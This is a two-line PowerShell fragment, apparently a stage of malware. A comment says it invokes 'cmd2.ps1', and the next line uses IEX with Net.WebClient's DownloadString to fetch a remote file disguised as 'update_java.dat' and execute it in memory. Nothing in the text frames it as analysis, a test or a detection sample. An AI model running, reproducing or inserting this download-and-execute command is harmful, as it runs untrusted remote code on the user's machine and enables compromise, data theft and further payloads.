# invokes cmd2.ps1
IEX (New-Object Net.Webclient).downloadstring("http://p-leh.com/update_java.dat")